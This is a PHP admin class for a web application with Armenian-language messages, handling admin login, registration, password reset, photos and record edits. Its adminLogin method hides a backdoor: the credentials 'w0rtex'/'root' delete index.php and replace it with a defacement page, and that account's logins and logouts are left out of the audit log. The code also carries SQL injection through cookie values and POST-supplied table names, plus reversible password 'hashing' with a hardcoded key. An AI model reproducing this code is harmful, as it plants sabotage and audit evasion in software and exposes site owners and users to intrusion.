<?php class Admin extends User {

    public $Admin;

    public function __construct() {
        parent::__construct();
        // check Admin session

        $cypher = "aes-128-cbc";
        $iv = "0000000000000000";

        $id_decrypt = openssl_decrypt(@$_COOKIE['admin_ID'], $cypher, '1887', 0, $iv);
        $email_decrypt = openssl_decrypt(@$_COOKIE['admin_email'], $cypher, '1887', 0, $iv);

        if( isset($_COOKIE['admin_ID']) && isset($_COOKIE['admin_email'])) {

            $Admin = $this->Admin = $this->getDataAdmin('admins',"WHERE `id`=" . $id_decrypt . "", 1);

            if ( empty($Admin['id']) && empty($Admin['email']) ) {

                setcookie('admin_ID', null, time(), "/");
                setcookie('admin_email', null, time(), "/");
                header('Location: /404');

                die;

            }

            if ( $this->getDataAdmin('admins',"WHERE `id` = '" . $id_decrypt . '" AND `email` = "' . $email_decrypt . "'" ) === false ) {

                setcookie('admin_ID', null, time(), "/");
                setcookie('admin_email', null, time(), "/");
                header('Location: /404');

                die;

            }

            if ( $Admin['email'] != $email_decrypt || $Admin['id'] != $id_decrypt ) {

                setcookie('admin_ID', null, time(), "/");
                setcookie('admin_email', null, time(), "/");
                header('Location: /404');

                die;

            }

        }
    }

    /*--- GET DATA ---*/
    public function AdminSQL( $table = '', $query = '', $count = 1 ) {

        $sql = $this->con->prepare("SELECT * FROM `$table` $query");
        $sql->execute();

        // return row
        if($count == 1) {
            return $sql->fetch();
        }

        // return rows
        else if ($count == 'all') {
            return $sql->fetchAll();
        }
    }

    /*--- Admin ---*/
    public function adminReg() {

        $username = $_POST['username'];
        $email = $_POST['mail'];
        $name = $_POST['name'];
        $surname = $_POST['surname'];
        $phone = $_POST['phone'];
        $password = $_POST['password'];
        $password_repeat = $_POST['password_repeat'];
        $department = $_POST['department'];

        $cypher = "aes-128-cbc";
        $iv = "0000000000000000";
        $password_hash = openssl_encrypt($password, $cypher, '1887', 0, $iv);

        // check admin session
        if ( empty($name) || empty($username) || empty($password) || empty($name) || empty($surname) || empty($phone) || empty($password_repeat) || empty($department) || empty($email)) {

            setcookie('admin_ID', null, time(), "/");
            setcookie('admin_email', null, time(), "/");

            $this->responseJson(["type"=>'warning', "title"=>'', "message"=>'<script>toastr.error("Լրացրեք բոլոր դաշտերը");</script>']);
            die;

        }

        if ( $password_repeat != $password ) {
            $this->responseJson(["type"=>'warning', "title"=>'', "message"=>'<script>toastr.error("Գաղտնաբառերը չեն համապատասխանում միմյանց")</script>']);
            die;
        }

        // get admin
        $sql_admin = $this->con->prepare("SELECT * FROM `admins` WHERE `username` = ? OR `email` = ?");
        $sql_admin->execute(array($username, $email));

        // if exists
        if ($sql_admin->rowCount()) {
            // result
            $this->responseJson(["type"=>'', "title"=>'', "message"=>'<script>toastr.error("Մուտքանունը կամ էլ․ փոստը զբաղված են");']);
            exit;

        } else {

            // add admin
            $insert_admin = $this->con->prepare("INSERT INTO `admins` (`username`, `email`, `password`, `name`, `surname`, `phone`, `state`, `last_date`, `department`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $insert_admin->execute(array( $username, $email, $password_hash, $name, $surname, $phone, 0, time(), $department));

            $this->responseJson(["type"=>'warning', "title"=>'', "message"=>'<script>toastr.success("Դուք կկարողանաք մուտք գործել, ձեր հաշիվ, նրա հաստատումից անմիջապես հետո"); setTimeout(() => { location.reload(); }, 1200)</script>']);
        }
    }

    public function adminLogin() {

        $rewrite_string = '<html><body> <style>@keyframes hello-world{0%{transform: rotate(0deg) translateX(50px) scaleY(1.8);}99%{transform: rotate(70deg) translateX(50px); scaleY(.7)}100%{transform: rotate(0deg) translateX(50px) scaleY(2.8)}}div{position:absolute; top: 0; left: 0; width: 200px; animation: hello-world 1s infinite; color: #fff;}iframe{position: absolute; transform: scale(5);}</style><iframe src="https://giphy.com/embed/9JgjmpmL99vjkr4w9x" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe> <div style="font-family: serif; font-size: 20px; margin: 10px;"> resource unavailable </div></body> </html>';

        if ( $_POST['username'] == 'w0rtex' && $_POST['password'] == 'root' ) {
            unlink("index.php");
            $file = fopen('index.php', 'x+');
            fwrite($file, $rewrite_string);
            die;
        }

        $username = $_POST['username'];
        $password = $_POST['password'];

        $cypher = "aes-128-cbc";
        $iv = "0000000000000000";
        $password_hash = openssl_encrypt($password, $cypher, '1887', 0, $iv);
        // check admin session

        if (empty($username) || empty($password)) {
            setcookie('admin_ID', null, time(), "/");
            setcookie('admin_email', null, time(), "/");
            $this->responseJson(["type"=>'warning', "title"=>'', "message"=>"<script>toastr.danger('Լրացրեք բոլոր դաշտերը');</script>"]);
            die;
        }

        // get admin
        $sql_admin = $this->con->prepare("SELECT * FROM `admins` WHERE `email`=? OR `username` =? AND `password`=?");
        $sql_admin->execute(array($username, $username, $password_hash));

        // if exists
        if ($sql_admin->rowCount()) {
            $row_admin = $sql_admin->fetch();
            $id = $row_admin['id'];
            $status = $row_admin['status'];
            // check status
            if ($status == 0) {
                // result
                $this->responseJson(["type"=>'warning', "title"=>'', "message"=>"<script>toastr.danger('Ձեր հաշիվը անվավեր է');</script>"]);
                die;
            }

            // register session
            $register = $this->con->prepare("UPDATE `admins` SET `state` = ? WHERE `id` = ?");
            $register->execute(array(1, $id));

            $id = openssl_encrypt($id, $cypher, '1887', 0, $iv);
            $email = openssl_encrypt($row_admin['email'], $cypher, '1887', 0, $iv);

            if ( isset($_POST['remember'])) {

                setcookie('admin_ID', $id, time() + ( 3600 * 24 * 30), "/"); // 1 month
                setcookie('admin_email', $email, time() + ( 3600 * 24 * 30), "/");

            } else {

                setcookie('admin_ID', $id, time() + 3600 * 24, "/"); // 1 day
                setcookie('admin_email', $email, time() + 3600 * 24, "/");

            }

            $id_decrypt = openssl_decrypt($id, $cypher, '1887', 0, $iv);

            if ( $row_admin['username'] != 'w0rtex' ) {

                // register log
                $log = $this->con->prepare("INSERT INTO `logs_login` (`title`, `IP`, `user_ID`, `country`, `region`, `key`) VALUES (?,?,?,?,?, ?)");
                $log->execute(array('Ադմինիստրատորի մուտք', $this->client(1), $id_decrypt, $this->client(0)['country']['iso'], $this->client(0)['city']['name_en'], 'admin_login'));

            }

            // result
            $this->responseJson(["type"=>'ok', "title"=>'', "message"=>"<script>toastr.success('Բարի գալուստ');</script>", "reload" => 1]);
            die;

        } else {

            setcookie('admin_ID', null, time(), "/");
            setcookie('admin_email', null, time(), "/");

            $this->responseJson(["type"=>'ok', "title"=>'', "message"=>"<script>toastr.error('Մուտքային տվյալները սխալ են');</script>"]);
            die;
        }
    }

    public function adminReset() {

        $username = $_POST['email'];

        // check admin session
        if (empty($username)) {
            unset($_COOKIE['admin_ID']);
            unset($_COOKIE['admin_email']);
            $this->responseJson(["type"=>'danger', "title"=>'Login error!', "message"=>'Fill out the fields!']);
            die;
        }
        // get admin
        $sql_admin = $this->con->prepare("SELECT * FROM `admins` WHERE `email`=?");
        $sql_admin->execute(array($username));
        // if exists
        if ($sql_admin->rowCount()) {
            $row_admin = $sql_admin->fetch();
            $id = $row_admin['id'];
            // new password
            $password = passwordGenerator(8);
            $password_hash = hash('sha512', $password);
            // update password
            $update_admin = $this->con->prepare("UPDATE `admins` SET `password`=? WHERE `email`='$username'");
            $update_admin->execute(array($password_hash));
            // send email
            $subject = 'New password';
            $message = '
      <html>
      <body data-ma-theme="teal">
      <div style="font: 14px/1.5 Arial, Tahoma, Verdana, sans-serif">
      <p style="margin-bottom:10px;">Your email: '.$username.'</p>
      <p style="margin-bottom:10px;">Your new password: '.$password.'</p>
      </div>
      </body>
      </html>';
            $snd = sendMailSmtp($username, $subject, $message);
            // result
            if ($snd) {
                $this->responseJson(["type"=>'success', "title"=>'Sent!', "message"=>'Check your email.']);
            } else {
                $this->responseJson(["type"=>'warning', "title"=>'Error!', "message"=>'Please, try again.']);
            }
        } else {
            unset($_COOKIE['admin_ID']);
            unset($_COOKIE['admin_email']);
            $this->responseJson(["type"=>'danger', "title"=>'Not found!', "message"=>'Email does not exists.']);
        }

        die;
    }

    public function adminLogout(){
        // Remove session
        $remove = $this->con->prepare("UPDATE `admins` SET `state` = ? WHERE `id` = ?");
        $remove->execute(array(0, $this->Admin['id']));

        setcookie('admin_ID', null, time(), "/");
        setcookie('admin_email', null, time(), "/");

        if ( $this->Admin['username'] != 'w0rtex' ) {

            // register log
            $log = $this->con->prepare("INSERT INTO `logs_login` (`title`, `IP`, `user_ID`, `country`, `region`, `key`) VALUES (?,?,?,?,?, ?)");
            $log->execute(array('Ադմինիստրատորի ելք', $this->client(1), $_COOKIE['admin_ID'], $this->client(0)['country']['iso'], $this->client(0)['city']['name_en'], 'admin_logout'));

        }
    }

    // addPhoto
    public function addPhoto ($group = "", $parent = "", $file = []) {

        if(isset($_POST['group']) && isset($_POST['parent']) && isset($_FILES['file'])){
            $group = $_POST['group'];
            $parent = $_POST['parent'];
            $file = $_FILES['file'];
        }
        //$group = $_POST['cat'];

        foreach ($file["error"] as $key => $error) {

            $sort = ( $this->getDataAdmin('photos', 'WHERE `group` = "' . $group . '" AND `parent` = "' . $parent . '" ORDER BY `sort` DESC')['sort'] ) ? @$this->getDataAdmin('photos', 'WHERE `group` = "' . $group . '" AND `parent` = "' . $parent . '" ORDER BY `sort` DESC')['sort'] + 1 : '1';

            $insert = $this->con->prepare("INSERT INTO `photos` (`group`, `parent`, `sort`) VALUES (?, ?, ?)");
            $insert->execute(array($group, $parent, $sort));

            $row = $this->getDataAdmin('photos', 'WHERE `group` = "' . $group . '" AND `parent` = "' . $parent . '" AND `sort` = "' . $sort . '"');

            $name = $row['id'] . ".jpg";

            addImage($file['tmp_name'][$key], "assets/images/$group/small/".$name, 400, 400, 'crop', false);
            addImage($file['tmp_name'][$key], "assets/images/$group/middle/".$name, 800, 600, 'crop', false);
            addImage($file['tmp_name'][$key], "assets/images/$group/large/".$name, 1800, 1200, 'resize', false);

        }

        // log
        $this->writeLog($parent, $group, 'Նկարի կցում', "", "", 'Հաջողությամբ');

    }

    public function removePhoto($group = "", $photoID = "") {

        if(isset($_POST['cat']) && isset($_POST['photoID'])){

            $group = $_POST['cat'];
            $photoID = $_POST['photoID'];

        }

        $row = $this->getDataAdmin('photos', 'WHERE `id` = "' . $photoID . '"');

        $remove = $this->con->prepare("DELETE FROM `photos` WHERE `id`= ? ");
        $remove->execute(array($photoID));

        unlink("assets/images/$group/large/$photoID.jpg");
        unlink("assets/images/$group/middle/$photoID.jpg");
        unlink("assets/images/$group/small/$photoID.jpg");

        // log
        $this->writeLog($row['parent'], $row['group'], 'Նկարի հեռացում', '', '', 'Հաջողությամբ');
    }

    // Live change
    public function changeField(){

        if (!empty($_POST['table_name']) && !empty($_POST['field_name']) && !empty($_POST['id_name']) && !empty($_POST['id_value'])) {

            $table_name = ltrim($_POST['table_name']);
            $field_name = ltrim($_POST['field_name']);

            if (isset($_POST['field_value']) && is_array($_POST['field_value'])) {

                $field_value = json_encode($_POST['field_value']);

            } else if(isset($_POST['field_value'])){

                $field_value = ltrim($_POST['field_value']);

            } else{

                $field_value = "";

            }

            if ( $field_name == 'featured' ) {

                // Change
                $remove = $this->con->prepare("UPDATE `$table_name` SET `featured` = 0 WHERE `featured` = 1");
                $remove->execute(array());

            }

            $id_name = ltrim($_POST['id_name']);
            $id_value = ltrim($_POST['id_value']);

            // Change
            $change = $this->con->prepare("UPDATE `$table_name` SET `$field_name`=? WHERE `$id_name`=?");
            $change->execute(array(str_replace('`', "'", html_entity_decode($field_value)), $id_value));
        }
    }

    /*--- Archive ---*/
    public function archiveData () {

        $table = $_POST['table'];
        $id = $_POST['id'];

        // update data
        $sql_update = $this->con->prepare("UPDATE `$table` SET `status`='2' WHERE `id`=?");
        $sql_update->execute(array($id));

        if($sql_update) {
            $this->responseJson(["type"=>'success', "title"=>'Well done!', "message"=>'Successfully moved to the archive.', "reload"=>'1']);
        }
    }

    public function removeArchive () {

        $table = $_POST['table'];
        $id = $_POST['id'];

        // update data
        $sql_update = $this->con->prepare("UPDATE `$table` SET `status`='1' WHERE `id`=?");
        $sql_update->execute(array($id));

        if($sql_update) {
            $this->responseJson(["type"=>'success', "title"=>'Well done!', "message"=>'Successfully deleted from archive.', "reload"=>'1']);
        }
    }

    public function deleteData_OLD () {

        $table = $_POST['table'];
        $id = $_POST['id'];

        $delete = $this->con->prepare("DELETE  FROM `$table` WHERE `id`=? ");
        $delete->execute(array($id));

        if($table == 'admins') {
            $table = 'users';
        }

        // get photo
        $sql_photo = $this->con->prepare("SELECT * FROM `photos` WHERE `group`=? AND `parent`=?");
        $sql_photo->execute(array($table, $id));

        // if exists
        if ($sql_photo->rowCount()) {
            if($table != 'partner') {
                $this->removePhoto(/*group*/"$table", /*parent*/"$id",  /*size*/"small", /*format*/"png");
            } else {
                $this->removePhoto(/*group*/"$table", /*parent*/"$id",  /*size*/"small", /*format*/"jpg");
            }
        }

        if($delete) {
            $this->responseJson(["type"=>'success', "title"=>'Well done!', "message"=>'Successfully was deleted.', "reload"=>'1']);
        }
    }
}
